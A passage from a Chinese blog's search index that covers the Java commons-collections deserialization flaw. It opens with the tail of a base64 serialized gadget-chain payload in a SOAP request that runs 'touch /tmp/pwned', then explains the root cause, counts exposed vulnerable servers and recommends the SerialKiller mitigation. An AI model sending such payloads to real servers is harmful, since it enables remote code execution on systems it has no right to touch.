QIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEHRvdWNoIC90bXAvcHduZWR0AARleGVjdXEAfgAeAAAAAXEAfgAjc3EAfgARc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==&lt;/objectname&gt;&lt;attribute xsi:type=&quot;xsd:string&quot;&gt;ringBufferSize&lt;/attribute&gt;&lt;/ns1:getAttribute&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt; 其它因为这个安全问题的根源在于ObjectInputStream处理反序列化时接受外部输入，而又由于其他类似InvokerTransformer的类的构造函数被调用，从而造成执行，而InvokerTransformer方便的提供了根据外部输入类名函数名反射执行的作用，所以造成整个程序RCE。 所以该问题并不是像其他一些语言unserialize函数本身存在漏洞，而是在应用本身实现的方式上存在缺陷，导致应用受到RCE的影响，开个脑洞引申一下，可以很明了的发现，远远不止breenmachine所指出的这几个流行web server，更可能影响更多使用了commons－collections，并且触发ObjectInputStream反序列化操作的应用，如一些java开发的CMS，中间件等等，甚至不仅仅是PC端，移动端如Android的很多app都可能受到该问题影响。 漏洞影响通过简单的全网分析和POC验证。 Jenkins收到该漏洞影响较大，在自测中，全球暴露在公网的11059台均受到该问题影响，zoomeye的公开数据中再测试后有12493受到该漏洞影响，shadon的公开数据中16368台jenkins暴露公网可能受到影响(未复测shadon数据)。 Weblogic因为公开到公网的数据较少，所以受影响面也稍微少一些，在自测中，全球486台均受到该问题影响，zoomeye的公开数据中再测试后有201台收到该漏洞影响，shadon的公开数据中806 台weblogic可能受到影响(未复测shadon数据)。 Jboss因为需要/invoker/JMXInvokerServlet的支持，所以受影响面稍小(但我们并未具体检测jboss中没有删除/invoker/JMXInvokerServlet的数据)，在自测中，全球29194台jboss暴露在公网，但由于大部分jboss都删除了jmx，所以真正受到影响的覆盖面并不广，zoomeye的公开数据中有7770台jboss暴露在公网，shadon的公开数据中46317台jboss暴露在公网。 WebSphere在自测中，全球暴露在公网的2076台均受到该问题影响，zoomeye的公开数据中再测试后仍有4511台websphere受到影响，shadon的公开数据中5537 台websphere可能受到影响(未复测shadon数据)。 修复建议因为受影响的多家厂商在今年1月拿到POC至今都没有对该问题做任何修复，所以短期内并不会有官方补丁放出，如果很重视这个安全问题并且想要有一个临时的解决方案可以参考NibbleSecurity公司的ikkisoft在github上放出了一个临时补丁SerialKiller。 下载这个jar后放置于classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类，SerialKiller有Hot-Reload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。 lib地址:https://github.com/ikkisoft/SerialKiller 参考资料 Matthias Kaiser - Exploiting Deserialization Vulnerabilities in Java. https://github.com/frohoff/ysoserial foxglovesecurity analysis github JavaUnserializeExploits appseccali-2015-marshalling-pickles","categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"}]}],"categories":[{"name":"java","slug":"java","permalink":"https://gschaos.club/categories/java/"},{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/categories/kafka/"},{"name":"架构","slug":"架构","permalink":"https://gschaos.club/categories/%E6%9E%B6%E6%9E%84/"},{"name":"jvm","slug":"jvm","permalink":"https://gschaos.club/categories/jvm/"},{"name":"操做系统","slug":"操做系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E5%81%9A%E7%B3%BB%E7%BB%9F/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"网站","slug":"网站","permalink":"https://gschaos.club/categories/%E7%BD%91%E7%AB%99/"},{"name":"nginx","slug":"nginx","permalink":"https://gschaos.club/categories/nginx/"},{"name":"图床","slug":"图床","permalink":"https://gschaos.club/categories/%E5%9B%BE%E5%BA%8A/"},{"name":"linux","slug":"linux","permalink":"https://gschaos.club/categories/linux/"},{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"网络是怎么连接的","slug":"网络是怎么连接的","permalink":"https://gschaos.club/categories/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%9E%E6%8E%A5%E7%9A%84/"},{"name":"数据库字段动态扩展","slug":"数据库字段动态扩展","permalink":"https://gschaos.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%97%E6%AE%B5%E5%8A%A8%E6%80%81%E6%89%A9%E5%B1%95/"},{"name":"工具","slug":"工具","permalink":"https://gschaos.club/categories/%E5%B7%A5%E5%85%B7/"},{"name":"RateLimiter限流","slug":"RateLimiter限流","permalink":"https://gschaos.club/categories/RateLimiter%E9%99%90%E6%B5%81/"},{"name":"spring","slug":"spring","permalink":"https://gschaos.club/categories/spring/"},{"name":"Spring","slug":"Spring","permalink":"https://gschaos.club/categories/Spring/"},{"name":"傅里叶变换","slug":"傅里叶变换","permalink":"https://gschaos.club/categories/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/tags/kafka/"},{"name":"架构","slug":"架构","permalink":"https://gschaos.club/tags/%E6%9E%B6%E6%9E%84/"},{"name":"操作系统","slug":"操作系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"操做系统","slug":"操做系统","permalink":"https://gschaos.club/tags/%E6%93%8D%E5%81%9A%E7%B3%BB%E7%BB%9F/"},{"name":"jvm","slug":"jvm","permalink":"https://gschaos.club/tags/jvm/"},{"name":"设计模式","slug":"设计模式","permalink":"https://gschaos.club/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"服务器","slug":"服务器","permalink":"https://gschaos.club/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"ssl","slug":"ssl","permalink":"https://gschaos.club/tags/ssl/"},{"name":"网站","slug":"网站","permalink":"https://gschaos.club/tags/%E7%BD%91%E7%AB%99/"},{"name":"https","slug":"https","permalink":"https://gschaos.club/tags/https/"},{"name":"nginx","slug":"nginx","permalink":"https://gschaos.club/tags/nginx/"},{"name":"图床","slug":"图床","permalink":"https://gschaos.club/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"分页管理","slug":"分页管理","permalink":"https://gschaos.club/tags/%E5%88%86%E9%A1%B5%E7%AE%A1%E7%90%86/"},{"name":"linux","slug":"linux","permalink":"https://gschaos.club/tags/linux/"},{"name":"shell","slug":"shell","permalink":"https://gschaos.club/tags/shell/"},{"name":"内存","slug":"内存","permalink":"https://gschaos.club/tags/%E5%86%85%E5%AD%98/"},{"name":"ngrok","slug":"ngrok","permalink":"https://gschaos.club/tags/ngrok/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://gschaos.club/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"数据库","slug":"数据库","permalink":"https://gschaos.club/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://gschaos.club/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"sonarQube","slug":"sonarQube","permalink":"https://gschaos.club/tags/sonarQube/"},{"name":"单元测试","slug":"单元测试","permalink":"https://gschaos.club/tags/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"name":"内存模型","slug":"内存模型","permalink":"https://gschaos.club/tags/%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"},{"name":"Mysql","slug":"Mysql","permalink":"https://gschaos.club/tags/Mysql/"},{"name":"Guava","slug":"Guava","permalink":"https://gschaos.club/tags/Guava/"},{"name":"maven","slug":"maven","permalink":"https://gschaos.club/tags/maven/"},{"name":"SeaweedFS","slug":"SeaweedFS","permalink":"https://gschaos.club/tags/SeaweedFS/"},{"name":"分布式文件系统","slug":"分布式文件系统","permalink":"https://gschaos.club/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"name":"Spring","slug":"Spring","permalink":"https://gschaos.club/tags/Spring/"},{"name":"多态","slug":"多态","permalink":"https://gschaos.club/tags/%E5%A4%9A%E6%80%81/"},{"name":"数学","slug":"数学","permalink":"https://gschaos.club/tags/%E6%95%B0%E5%AD%A6/"}]}